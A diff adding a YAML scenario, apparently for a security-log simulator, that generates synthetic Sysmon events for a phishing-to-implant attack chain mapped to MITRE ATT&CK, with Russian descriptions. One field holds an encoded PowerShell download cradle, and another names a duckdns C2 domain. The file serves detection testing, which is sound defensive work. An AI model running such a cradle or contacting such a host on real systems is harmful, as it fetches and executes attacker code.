@@ -1,0 +1,115 @@
+name: "Spearphishing Attachment leading to C2 and Exfiltration"
+description: >
+  Симуляция классической атаки через фишинговый документ Word.
+  Цепочка: Initial Access → Execution → Persistence → C2 → Exfiltration.
+  Покрывает тактики MITRE ATT&CK: TA0001, TA0002, TA0003, TA0011, TA0010.
+
+mitre_tactics:
+  - "TA0001"   # Initial Access
+  - "TA0002"   # Execution
+  - "TA0003"   # Persistence
+  - "TA0011"   # Command and Control
+  - "TA0010"   # Exfiltration
+
+mitre_techniques:
+  - "T1566.001"  # Spearphishing Attachment
+  - "T1059.001"  # PowerShell
+  - "T1053.005"  # Scheduled Task
+  - "T1071.001"  # Web Protocols (C2)
+  - "T1041"      # Exfiltration Over C2 Channel
+
+global_context:
+  host.name: "DESKTOP-HR-01"
+  host.domain: "corp.local"
+  user.name: "j.doe"
+  user.domain: "CORP"
+
+steps:
+  # ── Шаг 1: Открытие вредоносного вложения Word ──────────────────────
+  - id: "step_1_initial_access"
+    description: "Жертва открывает фишинговый документ WINWORD.EXE"
+    delay_from_start: "0s"
+    template: "sysmon_event_1"
+    fields:
+      process_name: "WINWORD.EXE"
+      process_path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      process_command_line: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\j.doe\\Downloads\\Invoice_Q2_2026.docm\""
+      parent_name: "explorer.exe"
+      parent_path: "C:\\Windows\\explorer.exe"
+      parent_pid: 3124
+      process_hash_sha256: "{{ random.hash_sha256 }}"
+      process_hash_md5: "{{ random.hash_sha256 }}"
+      process_guid: "{{ random.guid }}"
+      integrity_level: "Medium"
+
+  # ── Шаг 2: Word запускает PowerShell (макрос) ────────────────────────
+  - id: "step_2_execution"
+    description: "Макрос запускает PowerShell с obfuscated командой (IEX download cradle)"
+    depends_on: "step_1_initial_access"
+    delay_from_prev: "15s"
+    template: "sysmon_event_1"
+    fields:
+      process_name: "powershell.exe"
+      process_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      process_command_line: "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAiACkAKQA="
+      parent_name: "WINWORD.EXE"
+      parent_path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      parent_pid: "{{ step_1_initial_access.process_pid }}"
+      parent_guid: "{{ step_1_initial_access.process_guid }}"
+      process_hash_sha256: "{{ random.hash_sha256 }}"
+      process_guid: "{{ random.guid }}"
+      integrity_level: "High"
+      is_elevated: true
+
+  # ── Шаг 3: PowerShell устанавливает C2 соединение ───────────────────
+  - id: "step_3_c2_beacon"
+    description: "PowerShell подключается к C2-серверу атакующего"
+    depends_on: "step_2_execution"
+    delay_from_prev: "5s"
+    template: "sysmon_event_3"
+    fields:
+      process_name: "powershell.exe"
+      process_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      process_pid: "{{ step_2_execution.process_pid }}"
+      process_guid: "{{ step_2_execution.process_guid }}"
+      destination_ip: "{{ random.ip_external }}"
+      destination_port: 443
+      destination_domain: "update-service.duckdns.org"
+      source_port: "{{ random.port_high }}"
+      network_protocol: "tcp"
+      network_direction: "egress"
+
+  # ── Шаг 4: Сброс импланта на диск ───────────────────────────────────
+  - id: "step_4_dropper"
+    description: "PowerShell записывает имплант (RAT) в %TEMP%"
+    depends_on: "step_2_execution"
+    delay_from_prev: "8s"
+    template: "sysmon_event_11"
+    fields:
+      process_name: "powershell.exe"
+      process_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      process_pid: "{{ step_2_execution.process_pid }}"
+      process_guid: "{{ step_2_execution.process_guid }}"
+      file_path: "C:\\Users\\j.doe\\AppData\\Local\\Temp\\svchost32.exe"
+      file_name: "svchost32.exe"
+      file_directory: "C:\\Users\\j.doe\\AppData\\Local\\Temp"
+      file_extension: "exe"
+      file_hash_sha256: "{{ random.hash_sha256 }}"
+
+  # ── Шаг 5: Запуск импланта ──────────────────────────────────────────
+  - id: "step_5_implant_launch"
+    description: "PowerShell запускает скачанный имплант svchost32.exe"
+    depends_on: "step_4_dropper"
+    delay_from_prev: "3s"
+    template: "sysmon_event_1"
+    fields:
+      process_name: "svchost32.exe"
+      process_path: "C:\\Users\\j.doe\\AppData\\Local\\Temp\\svchost32.exe"
+      process_command_line: "\"C:\\Users\\j.doe\\AppData\\Local\\Temp\\svchost32.exe\" -s"
+      parent_name: "powershell.exe"
+      parent_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      parent_pid: "{{ step_2_execution.process_pid }}"
+      parent_guid: "{{ step_2_execution.process_guid }}"
+      process_hash_sha256: "{{ step_4_dropper.file_hash_sha256 }}"
+      process_guid: "{{ random.guid }}"
+      integrity_level: "High"
